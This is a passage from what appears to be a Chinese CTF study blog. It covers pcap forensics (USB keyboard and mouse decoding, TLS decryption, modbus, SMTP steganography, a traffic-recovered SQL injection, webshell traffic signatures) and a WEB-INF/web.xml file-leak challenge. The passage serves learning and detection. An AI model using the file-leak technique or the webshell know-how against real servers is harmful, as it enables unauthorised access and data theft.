class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">1</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">3</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">4</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">9</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">10</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">12</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">13</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">15</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">16</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">18</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">19</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">21</span>]!=<span class="string">&#x27;0&#x27;</span> <span class="keyword">or</span> line[<span class="number">22</span>]!=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         <span class="keyword">continue</span></span><br><span class="line">    nums.append(<span class="built_in">int</span>(line[<span class="number">6</span>:<span class="number">8</span>],<span class="number">16</span>)) </span><br><span class="line">keys.close()</span><br><span class="line">output = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> n <span class="keyword">in</span> mappings:</span><br><span class="line">        output += mappings[n]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output += <span class="string">&#x27;[unknown]&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;output :\n&#x27;</span> + output)</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-01.png"></p>
<blockquote>
<p>flag{7200[DEL]53[DEL]93}</p>
</blockquote>
<h2 id="USB流量-鼠标数量"><a href="#USB流量-鼠标数量" class="headerlink" title="USB流量 - 鼠标数量"></a>USB流量 - 鼠标数量</h2><p>先用tshark获取</p>
<p><code>tshark -r usb2.pcap -T fields -e usb.capdata | sed &#39;/^\s*$/d&#39; &gt; usbdata.txt</code></p>
<p>将数据通过：分隔开</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 将上面的文件用脚本分隔，加上冒号；</span></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\usbdata.txt&quot;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\桌面\\CTF\\Misc流量\\鼠标\\out.txt&quot;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">  a=f.readline().strip()</span><br><span class="line">  <span class="keyword">if</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a)==<span class="number">8</span>:<span class="comment">#键盘流量的话len为16鼠标为8 </span></span><br><span class="line">      out=<span class="string">&#x27;&#x27;</span></span><br><span class="line">      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(a),<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">if</span> i+<span class="number">2</span> != <span class="built_in">len</span>(a):</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>]+<span class="string">&quot;:&quot;</span> </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          out+=a[i]+a[i+<span class="number">1</span>] </span><br><span class="line">      f1.write(out) </span><br><span class="line">      f1.write(<span class="string">&#x27;\n&#x27;</span>) </span><br><span class="line">  <span class="keyword">else</span>: </span><br><span class="line">    <span class="keyword">break</span> </span><br><span class="line">f1.close()</span><br></pre></td></tr></table></figure></div>

<p>通过脚本转换成图片</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">img = Image.new(<span class="string">&#x27;RGB&#x27;</span>,(<span class="number">2000</span>,<span class="number">2000</span>),(<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))<span class="comment">#创建Image对象</span></span><br><span class="line">f =<span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\CTF\Misc流量\鼠标\out1.txt&quot;</span>)<span class="comment">#xy.txt文件 </span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">    point =line.split()</span><br><span class="line">    img.putpixel((<span class="built_in">int</span>(point[<span class="number">0</span>]),<span class="built_in">int</span>(point[<span class="number">1</span>])),(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))<span class="comment">#读取文件中的每一行，并修改像素 </span></span><br><span class="line">f.close() </span><br><span class="line">img.show()</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-02.png"></p>
<p>还可以通过gnuplot软件来生成图形，（windows和linux均可，都可以下载）</p>
<p>我是在windows下安装的，是个 exe软件，打开之后 </p>
<p>plot ‘filepath’</p>
<p>我是直接放在当前目录了 </p>
<p>生成之后用画图软件翻转一下即可</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-3-03.png"></p>
<hr>
<h2 id="Buu-TLS流量分析"><a href="#Buu-TLS流量分析" class="headerlink" title="Buu - TLS流量分析"></a>Buu - TLS流量分析</h2><p><a class="link" href="https://zhuanlan.zhihu.com/p/32059190">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>      <a class="link" href="https://www.jianshu.com/p/c793a279f698">了解学习OSI模型TCP&#x2F;IP模型 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a href="SSL/TLS%E4%BC%9A%E8%AF%9D%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">学习 SSL&#x2F;TLS会话流量分析</a></p>
<p>过滤http流量</p>
<p>发现有个数据包中有个log文件</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-00.png"></p>
<p>保存到本地为1.log，然后导入TLS的秘钥中</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-01.png"></p>
<p>再过滤http流量，发现多了一些流量，然后其中有一个保存有flag</p>
<h2 id="Buu-神比流量"><a href="#Buu-神比流量" class="headerlink" title="Buu - 神比流量"></a>Buu - 神比流量</h2><p>用Wireshark打开发现是USB数据；其中有一个数据包隐藏了7z文件</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-03.png"></p>
<p>选中 as a Hex Stream &#x3D;&gt; 在记事本中粘贴看看有没有问题</p>
<p>从37 7a开始选中，用脚本写入到.7z文件中</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&#x27;377abcaf271c00044aaed88750000000000000006a000000000000002d108d3939dc5abb57f2606b99b18fb7518aa378d2dcfed3f7a197d4e752b6156b026bf975d5fa5c37618bdfe2c567592e7128e139c1a6ac4e9eed598dd3398c03c16a35502e827004852aae6a7342214fa901c30104060001095000070b0100022406f107010a5307ef3e981518c6bd122121010001000c4a4600080a011a4cdb8a00000501190900000000000000000011130066006c00610067002e0074007800740000001900140a010066629f3bc46cd801150601002000000000000600313233343536&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:\\OneDrive\\桌面\\flag.7z&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>

<p>得到7z文件，发现其中的文件需要解密，用010打开7z文件，文末藏有密码123456</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-4-02.png"></p>
<p>打开flag.txt文件，是一个谷歌云盘的下载地址，下载下来之后，依然是一个压缩包（main.exe文件 和 out.txt文件），密码尝试一下123456成功</p>
<p>接下来不会了。看官方Wp（需要逆向分析exe文件 是进行了Xor运算）</p>
<p><a class="link" href="https://cloud.tencent.com/developer/article/2088394">官方Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h2 id="NSSCTF-NISACTF-2022-流量包里有个熊"><a href="#NSSCTF-NISACTF-2022-流量包里有个熊" class="headerlink" title="NSSCTF - [NISACTF 2022]流量包里有个熊"></a>NSSCTF - [NISACTF 2022]流量包里有个熊</h2><p>用wireshark打开，发现有个jpg图片</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-02.png"></p>
<p>将值弄出来放在文本中，用脚本写到图片中 [ 我不会直接将其复制在010中 ]</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata =<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#这里的hexdata太长了，就不粘贴了</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;E:\\OneDrive\\桌面\\test.jpg&#x27;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata)) <span class="comment"># unhexlify将十六进制数据转换为二进制数据</span></span><br></pre></td></tr></table></figure></div>

<p>然后对图片binwalk分离一下</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-03.png"></p>
<p>一个压缩包，一个flag.txt，一个图片</p>
<p>肯定先看flag，是base64加密，解密一下发现是假的</p>
<p>然后打开压缩包</p>
<p>最后发现了最后一个flag.txt文件，但是里面的数据看不懂，</p>
<p>看Wp说是加密，移位的加密 rot位移密码（rot5 rot13 rot18 rot47）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-04.png"></p>
<p><a class="link" href="https://lzltool.cn/Tools/Rot13">先将txt文本中的内容进行rot13解密 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-05.png"></p>
<p>然后就是使用刚开始的脚本将这段数据写在jpg中 [ 开头是ff d8 ff ]</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">hexdata = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;filepath&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(unhexlify(hexdata))</span><br></pre></td></tr></table></figure></div>

<p>得到的图片是有盲水印的</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-06.png"></p>
<p>看不清.</p>
<h2 id="NSSCTF-CISCN-2023-初赛-被加密的生产流量"><a href="#NSSCTF-CISCN-2023-初赛-被加密的生产流量" class="headerlink" title="NSSCTF - [CISCN 2023 初赛]被加密的生产流量"></a>NSSCTF - [CISCN 2023 初赛]被加密的生产流量</h2><p>用wireshark打开之后，发现有很多的modbus流量，且文件名就是modbus，很显然，追踪一下这个，看到了一些两个为一组的字符，题目中也提醒了是被加密的。想到了base加密</p>
<p>这个题的加密部分不多，手动复制粘贴即可，下面这个脚本（看Wp看到的）算是一个模板，如果以后碰到了特别多的，无法手动的，分析一下加密字符所在位置，用脚本提取</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyshark</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">tmp = <span class="number">0</span></span><br><span class="line">cap = pyshark.FileCapture(input_file=<span class="string">&quot;E:\\OneDrive\\桌面\\CTF\\Misc流量\\modbus.pcap&quot;</span>,tshark_path=<span class="string">&#x27;F:\\ctf\wireshark\\tshark&#x27;</span>,display_filter=<span class="string">&#x27;modbus  &amp;&amp; frame.len == 66&#x27;</span>)</span><br><span class="line"><span class="comment"># input_file 是流量的文件路径，tshark_path是tshark软件在的位置，一般是在WireShark命令下</span></span><br><span class="line"><span class="comment"># 后面的 display_filter 把它看做是wireshark中的过滤器。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex2str</span>(<span class="params"><span class="built_in">id</span>:<span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">id</span>)).replace(<span class="string">&quot;b&quot;</span>,<span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\&#x27;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> p <span class="keyword">in</span> cap:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(p.modbus.word_cnt) == <span class="number">5</span>: <span class="comment"># 我起初也没懂这个 word_cnt 打开流量包，发现是一个参数，为什么要等于5？ 因为加密的字符显示出来的十六进制数据是5位</span></span><br><span class="line">            tmp = p.modbus.word_cnt</span><br><span class="line">            tmp = <span class="built_in">str</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(p.modbus.word_cnt))).replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">            flag = flag + tmp</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">flag = hex2str(flag)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-5-01.png"></p>
<h2 id="NSSCTF-HGAME-2022-week1-好康的流量"><a href="#NSSCTF-HGAME-2022-week1-好康的流量" class="headerlink" title="NSSCTF - [HGAME 2022 week1]好康的流量"></a>NSSCTF - [HGAME 2022 week1]好康的流量</h2><p>wireshark打开，发现是SMTP和TCP协议，百度了一下啊</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-00.png"></p>
<blockquote>
<p>说明是发送了邮件</p>
</blockquote>
<p>就随便找，追踪TCP流时发现有base64加密的特征。</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-01.png"></p>
<blockquote>
<p>为什么会发现是base64加密？</p>
</blockquote>
<p>-&gt; 自己做的时候就直觉，写payload复现的时候发现有告诉是base64加密（追踪TCP流的页面）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-02.png"></p>
<p>告诉我们了这是png图片， &#x3D;&gt; base64解码成图片</p>
<p><a class="link" href="https://www.toolnb.com/tools/base64ToImages.html">在线解码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>接下来就是对图片的分析，我是先用虚拟机进行了foremost和binwalk 无果</p>
<p>然后就是用了StegSolve，但是我没发现什么（就几个选项过了一遍，没发现）</p>
<p>-&gt; 然后去看Wp了，一个是 Green通道2有条码</p>
<p>-&gt;LSB其实在base64解码的时候算是提醒了（但是我不会调参数）</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-03.png"></p>
<p><a class="link" href="https://tuzim.net/decode/">解条码网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-6-04.png"></p>
<p>两半flag拼接 <code>hgame&#123;ez_1mg_Steg4n0graphy&#125;</code></p>
<h2 id="攻防世界-流量分析1"><a href="#攻防世界-流量分析1" class="headerlink" title="攻防世界 - 流量分析1"></a>攻防世界 - 流量分析1</h2><p>下载<a class="link" href="https://adworld.xctf.org.cn/media/file/task/52ca22d3-4482-47ec-b6ae-7b702d1594e9.zip">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>，用wireshark打开，发现是关于gopher协议配合上的sql注入（gopher应该是ssrf，我光知道这个打redis什么的，没见过利用它写sql注入的），sql语句经过了两次url编码，解码之后发现是 时间盲注（sleep）</p>
<p>用tshark提取sql语句</p>
<p><code>tshark -r challenge.pcapng -T fields -Y &quot;http.request.method==GET&quot; -e &quot;frame.len&quot; -e &quot;http.request.uri.query.parameter&quot; &gt; data.txt</code></p>
<p>-&gt; 前面两三个跟这个有关的，改一下就能直接提取</p>
<p>-&gt; 写多了，发现了 如果想要自己独立提取信息，逐级的 跟上面的<code> -e &quot;http.request.uri.query.parameter&quot;</code>我自己没独立试过，但是发现这是有技巧的，也算是记住了</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-00.png"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># data.txt的信息是经过二次url编码的，通过这个脚本提取解码后的信息</span></span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;E:\OneDrive\桌面\out.txt&quot;</span>, <span class="string">&quot;wb&quot;</span>)</span><br><span class="line"></span><br><span class="line">lines = f1.readlines()</span><br><span class="line"><span class="built_in">print</span>(lines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(lines)):</span><br><span class="line">    <span class="built_in">print</span>(lines[i])</span><br><span class="line">    <span class="built_in">str</span> = unquote(unquote(lines[i],<span class="string">&#x27;utf-8&#x27;</span>), <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    f.write(<span class="built_in">str</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>out.txt</p>
<p>能力有限，我无法直接光提取sql语句了，但是我想到通过 搜索功能、</p>
</blockquote>
<p>(select flag from flag),15,1)，第一条的结果上方就是(select flag from flag),14,1)的最后一位，即第14位的Ascii码值了</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Misc/%E6%B5%81%E9%87%8F/4-7-01.png"></p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">result = <span class="number">102</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">103</span>, <span class="number">123</span>, <span class="number">49</span>, <span class="number">113</span>, <span class="number">119</span>, <span class="number">121</span>, <span class="number">50</span>, <span class="number">55</span>, <span class="number">56</span>, <span class="number">49</span>, <span class="number">125</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(result[i])</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>

<h2 id="攻防世界-流量分析2"><a href="#攻防世界-流量分析2" class="headerlink" title="攻防世界 - 流量分析2"></a>攻防世界 - 流量分析2</h2><p>导出Http对象，发现每个包中都有几个字符，观察发现拼接起来就是flag</p>
<p>我做的时候没看到ag只有fl，手动加上ag 提交成功</p>
<h2 id="23年蓝桥杯的一个题"><a href="#23年蓝桥杯的一个题" class="headerlink" title="23年蓝桥杯的一个题"></a>23年蓝桥杯的一个题</h2><p>用WireShark打开文件，看到了flag.zip &#x3D;&gt;zip的标志PK</p>
<p>那么过滤一下 <code>http contains &quot;PK&quot;</code>  直接包含flag也可以</p>
<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-00.png"></p>
<p>&#x3D;&gt; 用kali中的 foremost分离出来 <code>foremost -T filename</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-01.png" alt="4-8-01"></p>
<p>打开flag.zip文件，发现有个flag.txt，但是有密码，有注释<code>密码的正则：ChunQiu\d&#123;4&#125;</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-02.png"></p>
<p>\d &#x3D;&gt; 正则匹配，表示一个数字 {4} 匹配四次</p>
<p>&#x3D;&gt; ChunQiu???? 四个数字</p>
<p>&#x3D;&gt; 想到掩码破解</p>
<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-8-03.png"></p>
<p>打开flag.txt 得到flag</p>
<h2 id="2021陇剑杯-webshell-—-Webshell流量分析"><a href="#2021陇剑杯-webshell-—-Webshell流量分析" class="headerlink" title="2021陇剑杯 - webshell — Webshell流量分析"></a>2021陇剑杯 - webshell — Webshell流量分析</h2><p><a class="link" href="https://pan.baidu.com/s/1X4Ujko8SQshNpnqyZq4C0w?pwd=1234">附件 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><code>第一问：找到黑客登录系统使用的密码</code></p>
<p>-&gt; 用wireshark打开，随便找一找，因为是密码 第一想法是post方法（隐蔽安全）</p>
<p>-&gt; 在<code>http.request.method == &quot;POST&quot; &amp;&amp; http contains &quot;login&quot;</code>可以找到</p>
<p><code>第二问：黑客修改了一个日志文件，日志文件的绝对路径</code></p>
<p>-&gt; 日志文件的内容，是通过TCP流传输的。我们要追踪TCP流</p>
<p>-&gt; 第一下肯定先直接过滤tcp流，直接对第一个流量包追踪tcp流 能看到明显特征</p>
<p>**-&gt; 我第一时间没想到tcp流 [ 看Wp说到的，且要与之前的1.php相联系 ]  **</p>
<p><img lazyload src="/images/loading.svg" data-src="/%E6%B5%81%E9%87%8F/4-16-00.png"></p>
<p><code>第三问：黑客获取webshell后，权限是？</code></p>
<p>-&gt; 想到之前看到了有whami，<code>tcp contains &quot;whami&quot;</code> 无果</p>
<p>-&gt; 最后在流量包中看到了www-data 但我不知道这是一种权限的名称（我只知道root和普通用户）</p>
<p>-&gt; 结果就是 www-data</p>
<p><code>第四问：webshell文件名</code></p>
<p>-&gt; 我们之前看到有<code>ini_set</code> &#x3D;&gt; 1.php</p>
<p>-&gt; ini_set 是蚁剑webshell的流量特征</p>
<p><code>第五问：黑客上传的代理工具客户端名字</code></p>
<p>-&gt; </p>
<p><code>第六问：黑客代理工具的回连服务端IP是</code></p>
<p><code>第七问：黑客的socks5的连接账号、密码是</code></p>
<hr>
<h4 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h4><p><a class="link" href="https://blog.csdn.net/m0_51198141/article/details/132643738">Wp <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.cnblogs.com/B0like/p/17486657.html">webshell流量特征01 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p><a class="link" href="https://www.clementi.top/2023/06/21/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">webshell流量特征02 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<blockquote>
<p>编码器：对发送的流量进行编码，服务端再对流量进行解码</p>
<p>解码器：服务端对返回流量编码，需要客户端通过解码器解码还原流量接收 </p>
</blockquote>
<blockquote>
<p>蚁剑的webshell来自菜刀，流量特征与菜刀相似</p>
</blockquote>
<blockquote>
<p>蚁剑流量特征：默认UA头是antswordxxx（可改） 正文内容用URL加密，解密后流量中最明显的是ini_set(“display_errors”,”0”)</p>
<p>这段代码基本上所有webshell工具都有，不过大部分都进行了编码，而蚁剑是明文</p>
<p>参数名：0x……&#x3D;</p>
</blockquote>
<blockquote>
<p>冰蝎：使用AES 128位对称加密的加密webshell ； Accept字段（存在于冰蝎任何一个通信阶段）</p>
</blockquote>
<blockquote>
<p>哥斯拉：cookie最后一个值后面跟有;分号</p>
</blockquote>
]]></content>
      <categories>
        <category>Misc</category>
      </categories>
      <tags>
        <tag>流量分析</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>/CTF/Web/Java/</url>
    <content><![CDATA[<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><h3 id="1-WEB-INF文件夹"><a href="#1-WEB-INF文件夹" class="headerlink" title="1.WEB-INF文件夹"></a>1.WEB-INF文件夹</h3><p>简单来说，java web是基于Tomcat服务器搭建的，通过servlet来开发。狭义来说，servlet是指Java语言实现的一个接口。</p>
<ul>
<li><p>&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的&#x3D;&#x3D;应用组件配置及命名规则。&#x3D;&#x3D;</p>
</li>
<li><p>&#x2F;WEB-INF&#x2F;classes&#x2F;：&#x3D;&#x3D;包含&#x3D;&#x3D;所有的 Servlet 类和其他类&#x3D;&#x3D;文件&#x3D;&#x3D;，类文件所在的目录结构与他们的包名称匹配。</p>
</li>
<li><p>&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</p>
</li>
<li><p>&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</p>
</li>
<li><p>&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件。</p>
</li>
</ul>
<h4 id="WEB-INF-web-xml泄露及漏洞利用"><a href="#WEB-INF-web-xml泄露及漏洞利用" class="headerlink" title="WEB-INF&#x2F;web.xml泄露及漏洞利用"></a>WEB-INF&#x2F;web.xml泄露及漏洞利用</h4><p>WEB-INF&#x2F;web.xml泄露的起因就是我们在使用网络架构的时候，对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;servlet-class&gt;  这个就是指向我们要注册的servlet 的类地址, 要带包路径</span><br><span class="line">&lt;servlet-mapping&gt;  是用来配置我们注册的组件的访问路径,里面包括两个节点</span><br><span class="line">一个是&lt;servlet-name&gt;，这个要与前面写的servlet一致</span><br><span class="line">另一个是&lt;url-pattern&gt;，配置这个组件的访问路径</span><br><span class="line">&lt;servlet-name&gt; 这个是我们要注册servlet的名字,一般跟Servlet类名有关</span><br><span class="line"></span><br><span class="line">举个例子</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;FlagController&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;com.wm.ctf.FlagController&lt;/servlet-class&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure></div>

<p><strong>例题：[RoarCTF 2019]Easy Java</strong></p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="1-RoarCTF-2019-Easy-Java"><a href="#1-RoarCTF-2019-Easy-Java" class="headerlink" title="1.[RoarCTF 2019]Easy Java"></a>1.[RoarCTF 2019]Easy Java</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><ul>
<li>WEB-INF&#x2F;web.xml文件泄露</li>
</ul>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>打开题目，登录框，下面有个help点一下试试</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/Java/9-16-00.png"></p>
<p>看到页面中的回显，是Java环境</p>
<p>看到url中有个filename参数 — 文件泄露[WEB-INF]的可能性</p>
<p>Bp抓包，当改成POST发送的时候，发现直接跳转到下载页面了</p>
<p>尝试访问<code>WEB-INF/web.xml</code></p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/Java/9-16-01.png"></p>
<p>web.xml文件泄露，根据右边的类文件进行访问</p>
<p><img lazyload src="/images/loading.svg" data-src="/CTF/Web/Java/9-16-02.png"></p>
<p>将回显进行base64解码即可得到flag</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a class="link" href="https://blog.csdn.net/Mrs_H/article/details/119576821">https://blog.csdn.net/Mrs_H/article/details/119576821 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>XSS学习</title>
